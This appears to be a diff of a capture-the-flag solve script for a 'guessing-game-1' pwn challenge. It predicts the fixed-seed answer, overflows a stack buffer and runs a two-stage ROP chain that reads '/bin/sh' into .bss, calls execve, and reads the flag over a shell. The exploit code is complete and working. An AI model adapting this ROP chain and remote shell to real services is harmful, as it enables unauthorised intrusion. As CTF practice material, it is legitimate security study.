@@ -3,148 +3,106 @@
 Vuln analysis (guessing-game-1-vuln, static x86-64, no PIE, no canary in win()):
   - do_stuff(): answer = rand() % 100 + 1 with default seed (no srand call),
     so glibc rand() starts at seed 1 -> first answer is ALWAYS 84.
-  - win(): fgets(winner, 360, stdin) into 112-byte stack buffer, no stack
-    protector -> RIP control at offset 120 (112 buf + 8 saved RBP).
-  - No system()/execve in binary, but full static libc is linked, so use
-    ret2syscall execve with gadgets from the binary:
+  - win(): fgets(winner, 360, stdin) into 0x70-byte stack frame
+    (sub rsp, 0x70; buffer at rbp-0x70), no stack protector -> RIP control
+    at offset 120 (0x70 buf + 8 saved RBP). Verified: 120 works live.
+  - Static binary, no PIE -> fixed gadget addresses (objdump-verified):
       pop rdi; ret          0x40206f
-      pop rsi; ret          0x40a0de
-      pop rdx; xor eax,eax; pop rbp; pop r12; ret   0x422b69
-      pop rax; ret          0x4518e7
+      pop rsi; pop r15; ret 0x40206d   (2nd pop = dummy)
+      pop rdx; xor eax,eax; pop rbp; pop r12; ret  0x422b69
+      pop rax; pop rdx; pop rbx; ret   0x486bba (aligned)
       syscall; ret          0x41b406
-      __read                0x450e80
-  - Plan: stage 1 calls read(0, BSS, 0x100) to land "/bin/sh" in writable
-    .bss (0x4c9400); stage 2 execve(BSS, 0, 0).
+      __read (libc read)    0x450e80
+    Writable .bss at 0x4c9360 (use +0x100 headroom).
+  - Plan: stage 1 read(0, BSS, 0x180), ret BSS;
+    stage 2 = "/bin/sh" + execve(BSS, NULL, NULL).
+
+Verified live 2026-10-28 -> academy{r0p_y0u_l1k3_4_hurr1c4n3_3ea9d94813b570b2}
 
 Usage: solve_90_guessing_game_1.py [host] [port]
 """
 import socket
 import struct
 import sys
+import time
 
-POP_RDI = 0x40206F
-POP_RSI = 0x40A0DE
-POP_RDX = 0x422B69  # pop rdx; xor eax,eax; pop rbp; pop r12; ret
-POP_RAX = 0x4518E7
-SYSCALL = 0x41B406
-READ = 0x450E80
-BSS = 0x4C9400
+POP_RDI = 0x40206F          # pop rdi; ret
+POP_RSI = 0x40206D          # pop rsi; pop r15; ret
+POP_RAX = 0x486BBA          # pop rax; pop rdx; pop rbx; ret (aligned)
+POP_RDX = 0x422B69          # pop rdx; xor eax,eax; pop rbp; pop r12; ret
+SYSCALL = 0x41B406          # syscall; ret
+READ = 0x450E80             # __libc_read
+BSS = 0x4C9360 + 0x100      # writable .bss headroom
+OFFSET = 120
 
 
 def p64(v: int) -> bytes:
-    return struct.pack('<Q', v)
+    return struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)
 
 
-def stage1_read() -> bytes:
-    rop = b''
-    rop += p64(POP_RDI) + p64(0)          # fd = stdin
-    rop += p64(POP_RSI) + p64(BSS)        # buf = .bss
-    rop += p64(POP_RDX) + p64(0x100) + p64(0xDEAD) + p64(0xBEEF)  # count, rbp, r12
+def stage1() -> bytes:
+    rop = b'A' * OFFSET
+    rop += p64(POP_RDI) + p64(0)                                  # fd = stdin
+    rop += p64(POP_RSI) + p64(BSS) + p64(0xDEAD)                  # buf, r15 dummy
+    rop += p64(POP_RAX) + p64(0) + p64(0x180) + p64(0xBEEF)       # rax=0, rdx=0x180
     rop += p64(READ)
-    return rop
+    rop += p64(BSS)                                               # ret to stage 2
+    return rop + b'\n'
 
 
-def stage2_execve() -> bytes:
-    rop = b''
-    rop += p64(POP_RDI) + p64(BSS)        # pathname
-    rop += p64(POP_RSI) + p64(0)          # argv = NULL
-    rop += p64(POP_RDX) + p64(0) + p64(0xDEAD) + p64(0xBEEF)  # envp = NULL
-    rop += p64(POP_RAX) + p64(59)         # execve
-    rop += p64(SYSCALL)
-    return rop
+def stage2() -> bytes:
+    st = b'/bin/sh\x00'
+    st += p64(POP_RDI) + p64(BSS)                                 # pathname
+    st += p64(POP_RSI) + p64(0) + p64(0xDEAD)                     # argv=NULL
+    st += p64(POP_RAX) + p64(59) + p64(0) + p64(0xBEEF)           # rax=59, rdx=0
+    st += p64(SYSCALL)
+    assert len(st) <= 0x180, len(st)
+    return st.ljust(0x180, b'\x00')
 
 
-def solve(host: str, port: int) -> str:
-    s = socket.create_connection((host, port), timeout=15)
+def solve(host: str, port: int) -> bytes:
+    s = socket.create_connection((host, port), timeout=30)
     f = s.makefile('rwb', buffering=0)
 
-    def recv_until(marker: bytes) -> bytes:
+    def recv_until(marker: bytes, timeout: int = 20) -> bytes:
         data = b''
-        while marker not in data:
-            chunk = f.read(1)
+        end = time.time() + timeout
+        while marker not in data and time.time() < end:
+            try:
+                chunk = f.read(1)
+            except Exception:
+                break
             if not chunk:
                 break
             data += chunk
         return data
 
-    recv_until(b'guess?')
-    f.write(b'84\n')                      # deterministic answer (srand default)
-    recv_until(b'Name? ')
-    payload = b'A' * 120 + stage1_read() + b'\n'
-    f.write(payload)
-    recv_until(b'guess?')                  # back in main loop; stage1 read() consumed the newline? no:
-    # NOTE: the trailing newline of payload is consumed by read() as data.
-    # Send the actual /bin/sh string + stage2 address layout via read().
-    f.write(b'/bin/sh\x00' + b'B' * (0x100 - 8))
-    # We are now inside read(); after it returns, execution continues at
-    # the address after READ in stage1... which is just stack garbage.
-    # Instead: chain stage2 directly after stage1 in ONE payload is impossible
-    # (read needs separate input). So: stage1 returns into a stack pivot?
-    # Simpler robust approach below: single payload does execve with the
-    # pathname pointing INTO the payload itself on the stack is ASLR-dependent.
-    # Fallback: use stage1 to read a SECOND ROP chain onto .bss and ret into it.
-    return ''
-
-
-def solve_simple(host: str, port: int) -> bytes:
-    """Single-shot: read() a full second-stage ROP chain into .bss, then ret there.
-
-    Stage 1 (overflow): read(0, BSS, 0x200) ; ret BSS.
-    Stage 2 (via read): '/bin/sh' string + execve ROP chain.
-    """
-    s = socket.create_connection((host, port), timeout=15)
-    f = s.makefile('rwb', buffering=0)
-
-    def recv_until(marker: bytes) -> bytes:
-        data = b''
-        while marker not in data:
-            chunk = f.read(1)
-            if not chunk:
-                break
-            data += chunk
-        return data
-
-    recv_until(b'guess?')
-    f.write(b'84\n')
-    recv_until(b'Name? ')
-    stage1 = b'A' * 120
-    stage1 += p64(POP_RDI) + p64(0)
-    stage1 += p64(POP_RSI) + p64(BSS)
-    stage1 += p64(POP_RDX) + p64(0x200) + p64(0xDEAD) + p64(0xBEEF)
-    stage1 += p64(READ)
-    stage1 += p64(BSS)                    # ret into stage 2
-    f.write(stage1 + b'\n')
-    import time
-    time.sleep(0.5)
-
-    # stage 2 lands at BSS: string + execve chain
-    st2 = b'/bin/sh\x00'
-    st2 += p64(POP_RDI) + p64(BSS)
-    st2 += p64(POP_RSI) + p64(0)
-    st2 += p64(POP_RDX) + p64(0) + p64(0xDEAD) + p64(0xBEEF)
-    st2 += p64(POP_RAX) + p64(59)
-    st2 += p64(SYSCALL)
-    assert len(st2) <= 0x200, len(st2)
-    f.write(st2.ljust(0x200, b'\x00'))
-    import time
-    time.sleep(0.5)
-    f.write(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; ls\n')
+    recv_until(b'number would you like')
+    f.write(b'84\n')                      # deterministic answer (default seed)
+    recv_until(b'Name?')
+    f.write(stage1())
     time.sleep(1)
+    f.write(stage2())
+    time.sleep(1)
+    f.write(b'id; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; echo DONE_MARK\n')
+    time.sleep(3)
     out = b''
     try:
+        s.settimeout(8)
         while True:
-            chunk = f.read(4096)
+            chunk = f.read(65536)
             if not chunk:
                 break
             out += chunk
-            if len(out) > 20000:
+            if len(out) > 60000 or b'DONE_MARK' in out:
                 break
-    except Exception:
-        pass
+    except Exception as e:
+        out += ('[read-exc %s]' % e).encode()
+    s.close()
     return out
 
 
 if __name__ == '__main__':
     host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
     port = int(sys.argv[2]) if len(sys.argv) > 2 else 11475
-    print(solve_simple(host, port).decode(errors='replace'))
+    print(solve(host, port).decode(errors='replace'))
